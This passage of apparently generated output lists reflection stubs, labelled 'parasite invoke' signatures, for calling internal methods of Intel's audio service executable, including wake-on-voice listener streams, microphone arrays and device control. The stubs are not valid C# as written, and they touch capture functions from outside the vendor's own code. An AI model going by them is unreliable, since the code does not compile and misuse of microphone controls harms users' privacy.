        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { PpDllClientSafeHandle _ppDllHandle, IntelSstBasicConfiguration& _configuration, Int32& _memorySize });
        ===END SIGNATURE===

Method: IntelSstPreProcInitialize
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.PpDllMethods"", true);
        var methodInfo = t.GetMethod(""IntelSstPreProcInitialize"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { PpDllClientSafeHandle _ppDllHandle, IntPtr& _instance, IntelSstBasicConfiguration& _configuration, ICLogger& _logger });
        ===END SIGNATURE===

Method: IntelSstPreProcSetConfig
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.PpDllMethods"", true);
        var methodInfo = t.GetMethod(""IntelSstPreProcSetConfig"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { PpDllClientSafeHandle _ppDllHandle, IntPtr _instance, IntPtr _configBlob, uint _blobSize });
        ===END SIGNATURE===

Method: IntelSstPreProcGetLatency
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.PpDllMethods"", true);
        var methodInfo = t.GetMethod(""IntelSstPreProcGetLatency"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { PpDllClientSafeHandle _ppDllHandle, IntPtr _instance, Int32& _msLatency });
        ===END SIGNATURE===

Method: IntelSstPreProcProcess
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.PpDllMethods"", true);
        var methodInfo = t.GetMethod(""IntelSstPreProcProcess"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { PpDllClientSafeHandle _ppDllHandle, IntPtr _instance, IntelSstInput& _input, IntPtr _outputBuffer });
        ===END SIGNATURE===

Method: IntelSstPreProcBurstProcess
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.PpDllMethods"", true);
        var methodInfo = t.GetMethod(""IntelSstPreProcBurstProcess"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { PpDllClientSafeHandle _ppDllHandle, IntPtr _instance, IntelSstBurstInput& _input, IntPtr _outputBuffer });
        ===END SIGNATURE===

Method: IntelSstPreProcReset
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.PpDllMethods"", true);
        var methodInfo = t.GetMethod(""IntelSstPreProcReset"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { PpDllClientSafeHandle _ppDllHandle, IntPtr _instance });
        ===END SIGNATURE===

Method: IntelSstPreProcRelease
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.PpDllMethods"", true);
        var methodInfo = t.GetMethod(""IntelSstPreProcRelease"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { PpDllClientSafeHandle _ppDllHandle, IntPtr _instance });
        ===END SIGNATURE===

Method: CreateLpalListenerInstance
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovListenerMethods"", true);
        var methodInfo = t.GetMethod(""CreateLpalListenerInstance"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        IntelAudioService.ControlModuleWrapper.IntelListenerSafeHandle result = (IntelAudioService.ControlModuleWrapper.IntelListenerSafeHandle) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: DisposeLpalListener
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovListenerMethods"", true);
        var methodInfo = t.GetMethod(""DisposeLpalListener"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntPtr _listnerHandle });
        ===END SIGNATURE===

Method: LCloseAllSessions
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovListenerMethods"", true);
        var methodInfo = t.GetMethod(""LCloseAllSessions"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelListenerSafeHandle _listnerHandle });
        ===END SIGNATURE===

Method: LCreateStream
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovListenerMethods"", true);
        var methodInfo = t.GetMethod(""LCreateStream"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelListenerSafeHandle _listnerHandle, uint _pid, string _ppMemoryName, string _rawMemoryName, uint _channelsCount, eIntcSpeechMode _speechMode, bool _enablePreprocessing });
        ===END SIGNATURE===

Method: LDestroyStream
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovListenerMethods"", true);
        var methodInfo = t.GetMethod(""LDestroyStream"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelListenerSafeHandle _listnerHandle, uint _pid });
        ===END SIGNATURE===

Method: LStart
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovListenerMethods"", true);
        var methodInfo = t.GetMethod(""LStart"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelListenerSafeHandle _listnerHandle, uint _pid });
        ===END SIGNATURE===

Method: LStop
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovListenerMethods"", true);
        var methodInfo = t.GetMethod(""LStop"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelListenerSafeHandle _listnerHandle, uint _pid });
        ===END SIGNATURE===

Method: LCfg
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovListenerMethods"", true);
        var methodInfo = t.GetMethod(""LCfg"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelListenerSafeHandle _listnerHandle, bool _stopStreamingOnWup, uint _keyPhraseDetectionSensitivity, string _sDataBlobFilePath, string _sDataReservedFilePath });
        ===END SIGNATURE===

Method: LRead
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovListenerMethods"", true);
        var methodInfo = t.GetMethod(""LRead"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelListenerSafeHandle _listnerHandle, uint _pid, Double& _performanceDiff });
        ===END SIGNATURE===

Method: LQueryNotif
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovListenerMethods"", true);
        var methodInfo = t.GetMethod(""LQueryNotif"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelListenerSafeHandle _listnerHandle, uint _pid, eIntcEventNotificationType& _notificationType });
        ===END SIGNATURE===

Method: LGetBufferMetadata
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovListenerMethods"", true);
        var methodInfo = t.GetMethod(""LGetBufferMetadata"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelListenerSafeHandle _listnerHandle, uint _pid, BufferMetadata& _bufferMetadata });
        ===END SIGNATURE===

Method: LGetDetectionData
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovListenerMethods"", true);
        var methodInfo = t.GetMethod(""LGetDetectionData"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelListenerSafeHandle _listnerHandle, uint _pid, DetectionData& _detectionData });
        ===END SIGNATURE===

Method: LOpenStream
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovListenerMethods"", true);
        var methodInfo = t.GetMethod(""LOpenStream"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelListenerSafeHandle _listnerHandle, uint _pid });
        ===END SIGNATURE===

Method: LWaitHandle
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovListenerMethods"", true);
        var methodInfo = t.GetMethod(""LWaitHandle"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntelListenerSafeHandle _listnerHandle, uint _pid });
        ===END SIGNATURE===

Method: LQuerySpeechMode
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovListenerMethods"", true);
        var methodInfo = t.GetMethod(""LQuerySpeechMode"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelListenerSafeHandle _listnerHandle, uint _pid, eIntcSpeechMode& _speechMode });
        ===END SIGNATURE===

Method: LReset
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovListenerMethods"", true);
        var methodInfo = t.GetMethod(""LReset"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelListenerSafeHandle _listnerHandle, uint _pid });
        ===END SIGNATURE===

Method: GetEx
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.ControlModuleException"", true);
        var methodInfo = t.GetMethod(""GetEx"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { String& _message });
        ===END SIGNATURE===

Method: CreateWoVControlInstance
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovControl.WovControlMethods"", true);
        var methodInfo = t.GetMethod(""CreateWoVControlInstance"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        IntelAudioService.ControlModuleWrapper.WovControl.IntelWovSafeHandle result = (IntelAudioService.ControlModuleWrapper.WovControl.IntelWovSafeHandle) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: DisposeWoVControl
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovControl.WovControlMethods"", true);
        var methodInfo = t.GetMethod(""DisposeWoVControl"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntPtr _wovHandle });
        ===END SIGNATURE===

Method: InitializeKsControl
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovControl.WovControlMethods"", true);
        var methodInfo = t.GetMethod(""InitializeKsControl"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntelWovSafeHandle _wovControllerPtr });
        ===END SIGNATURE===

Method: UnloadKsControl
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovControl.WovControlMethods"", true);
        var methodInfo = t.GetMethod(""UnloadKsControl"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelWovSafeHandle _wovControllerPtr });
        ===END SIGNATURE===

Method: WovConfigWaitHandle
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovControl.WovControlMethods"", true);
        var methodInfo = t.GetMethod(""WovConfigWaitHandle"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntelWovSafeHandle _wovControllerPtr });
        ===END SIGNATURE===

Method: CreateKsStream
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovControl.WovControlMethods"", true);
        var methodInfo = t.GetMethod(""CreateKsStream"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelWovSafeHandle _wovControllerPtr, uint _pid });
        ===END SIGNATURE===

Method: StartStream
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovControl.WovControlMethods"", true);
        var methodInfo = t.GetMethod(""StartStream"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelWovSafeHandle _wovControllerPtr });
        ===END SIGNATURE===

Method: RunStream
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovControl.WovControlMethods"", true);
        var methodInfo = t.GetMethod(""RunStream"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelWovSafeHandle _wovControllerPtr });
        ===END SIGNATURE===

Method: StopKsStream
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovControl.WovControlMethods"", true);
        var methodInfo = t.GetMethod(""StopKsStream"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelWovSafeHandle _wovControllerPtr });
        ===END SIGNATURE===

Method: GetSpeechDeviceId
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovControl.WovControlMethods"", true);
        var methodInfo = t.GetMethod(""GetSpeechDeviceId"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelWovSafeHandle _wovControllerPtr, String& _speechPinId });
        ===END SIGNATURE===

Method: UnloadPpClient
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovControl.WovControlMethods"", true);
        var methodInfo = t.GetMethod(""UnloadPpClient"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelWovSafeHandle _wovControllerPtr });
        ===END SIGNATURE===

Method: UnregisterKsEventHandle
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovControl.WovControlMethods"", true);
        var methodInfo = t.GetMethod(""UnregisterKsEventHandle"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelWovSafeHandle _wovControllerPtr });
        ===END SIGNATURE===

Method: ActivateDevice
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovControl.WovControlMethods"", true);
        var methodInfo = t.GetMethod(""ActivateDevice"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntelWovSafeHandle _wovControllerPtr, string _deviceId });
        ===END SIGNATURE===

Method: RemoveDevice
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovControl.WovControlMethods"", true);
        var methodInfo = t.GetMethod(""RemoveDevice"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntelWovSafeHandle _wovControllerPtr, string _deviceId, Int32& _devicesLeft });
        ===END SIGNATURE===

Method: AddDevice
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovControl.WovControlMethods"", true);
        var methodInfo = t.GetMethod(""AddDevice"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelWovSafeHandle _wovControllerPtr, string _deviceId });
        ===END SIGNATURE===

Method: IsCaptureDevice
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovControl.WovControlMethods"", true);
        var methodInfo = t.GetMethod(""IsCaptureDevice"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntelWovSafeHandle _wovControllerPtr, string _deviceId });
        ===END SIGNATURE===

Method: IsLpCapableDevice
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovControl.WovControlMethods"", true);
        var methodInfo = t.GetMethod(""IsLpCapableDevice"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntelWovSafeHandle _wovControllerPtr, string _deviceId });
        ===END SIGNATURE===

Method: GetFirstLpCapableArrayEndpointId
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovControl.WovControlMethods"", true);
        var methodInfo = t.GetMethod(""GetFirstLpCapableArrayEndpointId"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelWovSafeHandle _wovControllerPtr, bool _ppCapable, String& _endpointId });
        ===END SIGNATURE===

Method: GetActiveEndpointId
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovControl.WovControlMethods"", true);
        var methodInfo = t.GetMethod(""GetActiveEndpointId"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelWovSafeHandle _wovControllerPtr, String& _endpointId });
        ===END SIGNATURE===

Method: GetMicArray
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovControl.WovControlMethods"", true);
        var methodInfo = t.GetMethod(""GetMicArray"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntelWovSafeHandle _wovControllerPtr, KSAUDIO_MIC_ARRAY_GEOMETRY_WRAPPER& _geometry });
        ===END SIGNATURE===

Method: LoadKsPipeline
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovControl.WovControlMethods"", true);
        var methodInfo = t.GetMethod(""LoadKsPipeline"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntelWovSafeHandle _wovControllerPtr, uint _micChannelsCount, uint _referenceChannelsCount, ushort _bitDepth, ushort _containerSize, eIntcSpeechMode _mode, bool _preprocessed, uint _ksMicCoordArrayLen, Boolean& _usesPpDll });
        ===END SIGNATURE===

Method: GetKsStatus
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.WovControl.WovControlMethods"", true);
        var methodInfo = t.GetMethod(""GetKsStatus"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntelWovSafeHandle _wovControllerPtr, Boolean& _areWovNotificationsEnabled, Boolean& _isPreprocessingEnabled, UInt32& _micChannelsCount, UInt32& _referenceChannelsCount, UInt32& _ksMicCoordArrayLen, UInt16& _bitDepth, UInt16& _containerSize, EndpointDeviceData& _defaultDevice, string _queriedDevice });
        ===END SIGNATURE===

Method: CreateIOCTLControlInstance
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.ControlModuleWrapper.Ioctl.IoctlMethods"", true);
        var methodInfo = t.GetMethod(""CreateIOCTLControlInstance"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
